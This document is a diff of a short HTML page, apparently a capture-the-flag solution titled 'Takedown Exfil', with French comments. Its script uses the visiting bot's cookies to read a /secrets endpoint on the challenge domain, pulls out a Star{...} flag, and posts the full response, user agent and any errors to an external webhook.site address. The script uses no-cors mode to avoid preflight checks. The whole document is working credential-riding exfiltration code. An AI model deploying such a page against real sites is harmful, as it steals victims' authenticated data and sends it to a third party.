@@ -1,44 +1,25 @@
-<!doctype html>
-<meta charset="utf-8">
-<title>probe</title>
-<pre id="out">loading…</pre>
+<!doctype html><meta charset="utf-8"><title>Takedown Exfil</title>
+<h1>Exfil in progress…</h1>
 <script>
 (async () => {
-  const webhook = "https://webhook.site/7699f217-b736-4fc2-a0d7-dc471e38814d";
-  const out = document.getElementById('out');
-  function log(x){ out.textContent += (typeof x==='string'? x : JSON.stringify(x,null,2))+"\n"; }
-
+  const WH = "https://webhook.site/7699f217-b736-4fc2-a0d7-dc471e38814d";
   try {
-    const r = await fetch("https://api.takedown.cyxo.re/secrets", {
-      credentials: "include",            // <-- envoie les cookies *.cyxo.re du bot
-      mode: "cors"                        // CORS supposé permissif dans le challenge
+    // 1) Lire /secrets avec les cookies du bot
+    const r = await fetch("https://api.takedown.cyxo.re/secrets", { credentials: "include" });
+    const t = await r.text();
+
+    // 2) Exfil brute au webhook (no-cors => pas de preflight, mais le corps part bien)
+    const body = JSON.stringify({
+      when: new Date().toISOString(),
+      from: location.href,
+      ua: navigator.userAgent,
+      status: r.status,
+      text: t,
+      flag: (t.match(/Star\{[^}]+\}/) || [null])[0]
     });
-    const txt = await r.text();
-    log("GET /secrets -> " + r.status);
-    log(txt);
-
-    // Tente d’extraire Star{...}
-    let flag = null;
-    const m = txt.match(/Star\{[^}]+\}/);
-    if (m) flag = m[0];
-
-    // Exfil vers le webhook
-    await fetch(webhook, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        when: new Date().toISOString(),
-        from: location.href,
-        ua: navigator.userAgent,
-        status: r.status,
-        text: txt,
-        flag
-      })
-    });
-
-    out.textContent = "OK.\n" + (flag ? ("FLAG: " + flag + "\n") : "Flag non parsé (voir webhook).");
+    await fetch(WH, { method: "POST", mode: "no-cors", body });
   } catch (e) {
-    out.textContent = "ERR: " + e;
+    await fetch(WH, { method: "POST", mode: "no-cors", body: String(e) });
   }
 })();
 </script>
